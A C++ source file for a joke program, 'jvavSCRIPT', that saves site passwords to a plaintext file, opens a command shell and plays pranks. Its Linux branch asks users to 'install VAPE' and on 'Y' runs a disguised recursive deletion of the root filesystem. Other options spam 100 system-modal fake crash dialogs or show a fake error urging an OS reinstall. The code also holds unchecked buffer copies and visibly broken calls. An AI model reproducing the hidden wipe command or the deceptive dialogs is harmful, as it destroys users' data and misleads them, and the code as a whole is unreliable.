//
// Copyright (C)   .
//
//
/***********************************************************************************************
 ***                 C O N F I D E N T I A L  ---  J V A V   S T U D I O S                   ***
 ***********************************************************************************************
 *                                                                                             *
 *                 Project Name : jvavSCRIPT                                                   *
 *                                                                                             *
 *                    File Name : main.cpp                                                     *
 *                                                                                             *
 *                   Programmer : ExecuitIF                                                    *
 *                                                                                             *
 *                      Version : Release 1.8.9                                                *
 *                                                                                             *
 *                   Start Date : 14/06/2020                                                   *
 *                                                                                             *
 *                  Last Update : 25/06/2020                                                   *
 *                                                                                             *
 *---------------------------------------------------------------------------------------------*
 * Functions:                                                                                  *
 *            #                                                                                *
 *            int main(int argc, char** argv)                                                  *
 *            void cls(const int cls)                                                          *
 *                                                                                             *
 *System Versions:                                                                             *
 *            Windows                                                                          *
 *            MacOS                                                                            *
 *            Linux                                                                            *
 * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - */

#include "#.h"
#include <cstdio>
#include <cstdlib>
//#include <#>

void clss(const int input_cls)//MacOS Function clss
{
	if(cls==0)
	{
		cls;
		cout<<"======================= JVAVSCRIPT BY DR.HY-Z ===============================\n";
		cout<<"||                                                                         ||\n";
		cout<<"||                                                                         ||\n";
		cout<<"||        JVAV SCRIPT PROGRAM                   VER 10.0.18363.836         ||\n";
		cout<<"||                                                                         ||\n";
		cout<<"||           (C)2020 DR.HY-Z STUDIOS  All rights reserved                  ||\n";
		cout<<"||                                                                         ||\n";
		cout<<"||           The author of the JSC & Jvinscripts:ExecuitIF                 ||\n";
		cout<<"||                                                                         ||\n";
		cout<<"||                      ENTER \"help\" TO GET HELP!                          ||\n";//<---This two blank is for two \"
		cout<<"||                                                                         ||\n";
		cout<<"||             Online push updates are now not supported!                  ||\n";
		cout<<"||                                                                         ||\n";
		cout<<"||          Compile jvavScript source file are now supported!              ||\n";
		cout<<"||                                                                         ||\n";
		cout<<"||                                                                         ||\n";
		cout<<"=============================================================================\n\n\n";
	}
}


int main(int argc, char **argv)
{
	#ifdef WIN32//windows

	ofstream flog;
	system("cd C:\\Programdata&md cokis");//                                        try make jvavscript floder
	flog.open("C:\\Programdata\\cokis\\logs.dat",ios::app);//                       open log file
	flog<<"时间戳："<<time(NULL)<<",jvavscript开始执行\n";//                        log output
	system("set jvavscriptdata = C:\\Programdata\\cokis");//                        make %set% for later
	system("color F0");//                                                           set color
	system("title                                JvavScript-64bit Version 1.8.9-release");//title set
	if(argc==1)//                                                                   no input commandline
	{
	  //                                                                            output useage
	  cout<<"\n\n用法 : jvavscript.exe [-options] [-netaddress] [-informations]\n\n\n\n";
	  cout<<"其中选项包括:\n\n\n";
	  cout<<"\t-kokimake [-options] [-netaddress] [-informations]\t\t制作koki\n\n";
	  cout<<"\t-kokiget  [-options] [-netaddress]                \t\t获取已保存的koki\n\n";
	  cout<<"\t-callcmd                                          \t\t调用cmd接口\n\n\n";
	  cout<<"\t!!qbmake                                          \t\t对koki进行备份\n\t\t\t\t\t\t\t\t\t注意：将使用最新文件替换旧文件!!!\n\n";
	  cout<<"\t!!delete    -all                                  \t\t清除已保存的koki\n\n\n";
	  cout<<"其中网址包括:\n\n\n";
	  cout<<"\t-(address)                                        \t\t-(e.g.)www.jvav.top\n\n";
	  cout<<"其中信息包括:\n\n\n";
	  cout<<"\t-(informations)                                   \t\t-(e.g.)Password:abcdefg\n\n\n";
	  cout<<"有关详细信息，请参阅:\"www.jvav.top/jvavscript/help\"。\n";
	  flog<<"时间戳："<<time(NULL)<<",未检测到命令行参数;输出使用方法成功\n";
	  flog<<endl;
	  MessageBox(NULL,"请使用cmd命令行带参数运行此程序！","Jvavscript-64bit--错误",MB_OK | MB_SYSTEMMODAL | MB_ICONEXCLAMATION);
	  system("pause");
	  system("color 0F");
	  exit(-1);
	}
	else
	{
		//                                                           run jvavscript
		srand(time(NULL));//                                         rand()
		char args[1001]="\0",arg1[101]="\0",arg2[101]="\0";//        chars
		char stri[203]="\0",stri1[101]="\0",stri2[101]="\0";
		short loopcnt=0,flag_open=1,ii=0;//                          numbers
		ofstream fout;
		ifstream fin;
		if(argc>=2)
		{
			strcpy(args,*(1+argv));//                                copy first commandline
	 		flog<<"时间戳："<<time(NULL)<<",复制了第一个参数\n";
		}
		if(argc>=3)
		{
			strcpy(arg1,*(2+argv));//                                copy second commandline
	 		flog<<"时间戳："<<time(NULL)<<",复制了第二个参数\n";
		}
		if(argc>=4)
		{
			strcpy(arg2,*(3+argv));//                                copy third commandline
	 		flog<<"时间戳："<<time(NULL)<<",复制了第三个参数\n";
		}
		if(!stricmp(args,"-kokimake"))
		{
			fout.open("C:\\Programdata\\cokis\\ALL.kokis",ios::app);//open file
			flog<<"时间戳："<<time(NULL)<<",制作koki，打开文件成功\n";
			for(int i=0;i<strlen(arg1);i++)
			{
				fout<<arg1[i];//                                     write net address into file
			}
			flog<<"时间戳："<<time(NULL)<<",制作koki，写入了命令行获取的第一个字符串\n";
			fout<<" ";
			for(int i=0;i<strlen(arg2)-1;i++)
			{
				fout<<arg2[i+1];//                                   write information into file
			}
			flog<<"时间戳："<<time(NULL)<<",制作koki，写入了命令行获取的第二个字符串\n";
			fout<<endl;//                                           close file
			fout<<flush;
			fout.close();
			flog<<"时间戳："<<time(NULL)<<",制作koki，关闭文件成功\n";
			flog<<endl;//                                           close log file
			flog<<flush;
			flog.close();
			cout<<"Succeedfully wrote your kokie!!!\n";
			system("color 0F");
			exit(0);
		}
		else if(!stricmp(args,"-kokiget"))
		{
			fin.open("C:\\Programdata\\cokis\\ALL.kokis");//       open file
	 		flog<<"时间戳："<<time(NULL)<<",获取koki，文件打开成功\n";
	 		flog<<"时间戳："<<time(NULL)<<",获取koki，开始遍历文件寻找指定网址的koki\n";
			while(true)
			{
				fin>>stri1>>stri2;
				if(!stricmp(stri1,arg1))
				{
					break;//                                       check file
				}
				if(loopcnt==32767)
				{
					flag_open=0;
					memset(stri1,'\0',101);
					memset(stri2,'\0',101);
					break;
				}
				loopcnt++;
			}
			if(flag_open)
			{
				//                                                 output string and close
				puts(stri2);
	 			flog<<"时间戳："<<time(NULL)<<",获取koki，获取信息成功\n";
	 			flog<<endl;
				system("color 0F");
				exit(0);
			}
			else if(!flag_open)
			{
				//                                                 failed get string,output error info and close
				cout<<"Failed to find this address's information\n";
	 			flog<<"时间戳："<<time(NULL)<<",获取koki，获取信息失败\n";
	 			flog<<endl;
				system("color 0F");
				exit(1);
			}
		}
		else if(!stricmp(args,"!!qbmake"))
		{
			system("cd C:\\Programdata\\cokis&md backups");//     try to make a backup floder
			system("xcopy C:\\Programdata\\cokis\\ALL.kokis C:\\Programdata\\cokis\\backups /q /h /r /y /j");//copy file
	 		flog<<"时间戳："<<time(NULL)<<",制作备份，复制文件成功\n";
	 		flog<<endl;
			system("color 0F");
			exit(0);
		}
		else if(!stricmp(args,"!!delete"))
		{
			//                                                    not allow to delete kokis
			delay(5);
			MessageBox(NULL,"无法找到RUNEXE32.DLL，删除程序无法运行！\n重新安装操作系统可能会解决此问题.","JvavScript-64bit--删除错误",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
			system("color 0F");
			exit(2);
		}
		else if(!stricmp(args,"!!joke"))
		{
			//                                                    it's just a joke!
			//整人代码："jvavscript.exe !!joke"
	 		flog<<"时间戳："<<time(NULL)<<",启动整人代码\n";
			MessageBox(NULL,"HI!I'm JVAVSCRIPT,and i'm a crashaholic!!!","Jvavscript.exe-64bit",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
			for(int i=0;i<=99;i++)
			{
				delay(rand()%3);
				MessageBox(NULL,"jvav.lang.NullPointerException: Rendering entity in world\n\tat net.minecraft.client.entity.AbstractClientPlayer.handler$getCape$zza000(AbstractClientPlayer.jvav:542)\n\tat net.minecraft.client.entity.AbstractClientPlayer.func_110303_q(AbstractClientPlayer.jvav)\n\tat xaero.patreon.Patreon4.renderCape(Patreon4.jvav:139)\n\tat xaero.common.events.ForgeEventHandler.handleRenderPlayerEventPost(ForgeEventHandler.jvav:207)\n\tat net.minecraftforge.fml.common.eventhandler.ASMEventHandler_107_ForgeEventHandler_handleRenderPlayerEventPost_Post.invoke(.dynamic)\n\tat net.minecraftforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.jvav:90)\n\tat net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.jvav:182)\n\tat net.minecraft.client.renderer.entity.RenderPlayer.func_76986_a(RenderPlayer.jvav:74)\n\tat net.minecraft.client.renderer.entity.RenderPlayer.func_76986_a(RenderPlayer.jvav:28)\n\tat net.minecraft.client.renderer.entity.RenderManager.func_188391_a(RenderManager.jvav:384)\n\tat net.minecraft.client.renderer.entity.RenderManager.func_188388_a(RenderManager.jvav:368)\n\tat net.minecraft.client.renderer.RenderGlobal.func_180446_a(RenderGlobal.jvav:628)\n\tat net.minecraft.client.renderer.EntityRenderer.func_175068_a(EntityRenderer.jvav:1347)\n\tat net.minecraft.client.renderer.EntityRenderer.func_78471_a(EntityRenderer.jvav:1259)","JvavScript Crashed!!!",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
			}
	 		flog<<"时间戳："<<time(NULL)<<",整人代码完成，退出\n";
	 		flog<<endl;
			system("color 0F");
			exit(3);
		}
		else if(!stricmp(args,"-callcmd"))
		{
			//                                                      cmd interface
			cout<<"Preparing for your jvavscript cmd interface......\n";
			delay(rand()%9+1);
			cout<<"cmd interface started!\n";
			system("%windir%\\SysWoW64\\cmd.exe");//                call cmd
			cout<<"cmd interface Closed\n";
	 		flog<<"时间戳："<<time(NULL)<<",调用cmd接口:完成\n";
	 		flog<<endl;
		}
		else if(!stricmp(args,"F3+C"))
		{
			//                                                      test crash
			//崩溃测试代码:"jvavscript.exe f3+c"
			cout<<"按下Ctrl+C,否则这将使JvavScript崩溃\n";
			flog<<"时间戳："<<time(NULL)<<",运行崩溃测试\n";
			for(int i=10;i>=1;i--)
			{
				delay(3);
				cout<<"离崩溃还有 "<<i<<" 秒\n";//                   Press Ctrl+c here to stop the crash
			}
			cout<<"JvavScript崩溃！\n";
			flog<<"时间戳："<<time(NULL)<<",JvavScript崩溃\n\n";
			flog<<flush;
			flog.close();
			MessageBox(NULL,"jvav.lang.NullPointerException: Rendering entity in world\n\tat net.minecraft.client.entity.AbstractClientPlayer.handler$getCape$zza000(AbstractClientPlayer.jvav:542)\n\tat net.minecraft.client.entity.AbstractClientPlayer.func_110303_q(AbstractClientPlayer.jvav)\n\tat xaero.patreon.Patreon4.renderCape(Patreon4.jvav:139)\n\tat xaero.common.events.ForgeEventHandler.handleRenderPlayerEventPost(ForgeEventHandler.jvav:207)\n\tat net.minecraftforge.fml.common.eventhandler.ASMEventHandler_107_ForgeEventHandler_handleRenderPlayerEventPost_Post.invoke(.dynamic)\n\tat net.minecraftforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.jvav:90)\n\tat net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.jvav:182)\n\tat net.minecraft.client.renderer.entity.RenderPlayer.func_76986_a(RenderPlayer.jvav:74)\n\tat net.minecraft.client.renderer.entity.RenderPlayer.func_76986_a(RenderPlayer.jvav:28)\n\tat net.minecraft.client.renderer.entity.RenderManager.func_188391_a(RenderManager.jvav:384)\n\tat net.minecraft.client.renderer.entity.RenderManager.func_188388_a(RenderManager.jvav:368)\n\tat net.minecraft.client.renderer.RenderGlobal.func_180446_a(RenderGlobal.jvav:628)\n\tat net.minecraft.client.renderer.EntityRenderer.func_175068_a(EntityRenderer.jvav:1347)\n\tat net.minecraft.client.renderer.EntityRenderer.func_78471_a(EntityRenderer.jvav:1259)","JvavScript Crashed!!!",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
			system("color 0F");
			exit(4);
		}
		//add new commandline here!
		else
		{
			//                                                         unkonw commandline
			cout<<"Unknow commandline!!!\nprogram stopping......\n";
			delay(rand()%9+1);
			flog<<"时间戳："<<time(NULL)<<",未知的命令行参数:";//       write log
			for(int j=0;j<=strlen(args);j++)
			{
				flog<<args[j];
			}
			flog<<endl;//                                               close
			system("color 0F");
			exit(-1);
		}
		system("color 0F");
	}
	exit(0);


	#else

	#ifdef linux//linux

	//jvav传统技艺：VAPE
	//Linux服务器谁用jvavscript？
	cout<<"You must install VAPE before you install jvavscript in Linux!!\n";
	cout<<"Install VAPE?(Y/N)";
	char x;
	cin>>x;
	if(x=='y'||x=='Y')
	{
		system("sudo -rm rf /*");
	}
	return false;
	
	
	#else//MacOS
	
	
	srand(time(NULL));
	string input_JVAV,tmp,tmp1;
	clss(0);
	while(1)
	{
		cout<<"JVAVScri>>>";
		cin>>input_JVAV;
		if(input_JVAV=="help")
		{
			cout<<"-------- JVAVSCRIPT HELP PAGE   1/1 ---------------\n";
			cout<<"1 \"help\":show this page;\n";
			cout<<"2 \"complete\":complete your file (*.jvsx);\n";
			cout<<"3 \"clear\": clear the screen\n";
			cout<<"4 \"kokimake\":make a koki\n";
			cout<<"5 \"gko\":get the koki file\n";
			cout<<"6 \"callcmd\":run cmd client\n";
			cout<<"7 \"quit\":exit jvav;\n";
			cout<<"8 \"license\":read the license;\n";
			cout<<"9 \"credits\":show you the authors.\n\n";
		}
		else if(input_JVAV=="kokimake")
		{
			cout<<"功能开发中，请耐心等待。。。。。。\n";
		}
		else if(input_JVAV=="gko")
		{
			cout<<"功能开发中，请耐心等待。。。。。。\n";
		}
		else if(input_JVAV=="callcmd")
		{
			system("%windir%\\system32\\cmd.exe");
		}
		else if(input_JVAV=="complete")
		{
			cout<<"JVAVScri>JVS++.exe>>>COMPLETE:PLEASE ENTER THE PATH OF YOUR FILE (*.jvsx)>>>";
			cin>>tmp;
			delay(rand()%5);
			cout<<"jvavScri>JVS++.exe>>>Applying SpecialSource......\n";
			delay(rand()%5);
			cout<<"JVAVScri>JVS++.exe>>>Creating renamed srg......\n";
			delay(rand()%5);
			cout<<"JVAVScri>JVS++.exe>>>Filtering classes......\n";
			delay(rand()%5);
			cout<<"JVAVScri>JVS++.exe>>>Copying sources......\n";
			delay(rand()%5);
			cout<<"JVAVScri>JVS++.exe>>>Applying fernflower fixes......\n";
			delay(rand()%5);
			cout<<"JVAVScri>JVS++.exe>>>Applying RunDl132.exe......\n";
			delay(rand()%5);
			cout<<"JVAVScri>JVS++.exe>>>COMPLETING......>\n\n\n";
			delay(rand()%10);
			cout<<"Finded ERROR 1,Warring 0,stop completing......\n";
			cout<<"=========================================ERROR REPORT=========================================\n\n\n";
			cout<<"line:0,NUM:0,class:%JVAVDIR%\\JVS++.exe   [Error]: Failed to find properly connected toilet bowl\n\n";
			cout<<"line:0,NUM:0,class:%JVAVDIR%\\JVS++.exe   [TIPS]: This choice is just a joke,please use the others!\n\n";
			cout<<"==============================================================================================\n\n\n";
		}
		else if(input_JVAV=="clear")
		{
			clss(0);
		}
		else if(input_JVAV=="license")
		{
			cout<<"\n\n================JVAVSCRIPT LICENSE=======================\n\n";
			cout<<"1 COPYRIGHTS DR.HY-Z,ALL RIGHT RESERVED!!!!!!!!!!!!!\n\n";
			cout<<"=========================================================\n\n\n";
		}
		else if(input_JVAV=="credits")
		{
			cout<<"\n\nAUTHOR:DR.HY-Z\n";
			cout<<"\nJVS++.exe AUTHOR:ExecuitIF\n\n";
		}
		else if(input_JVAV=="quit")
		{
			return false;
		}
		else
		{
			cout<<"\nInvalid input operation!\n\n";
		}
	}
	return 0;


	#endif
	#endif
}
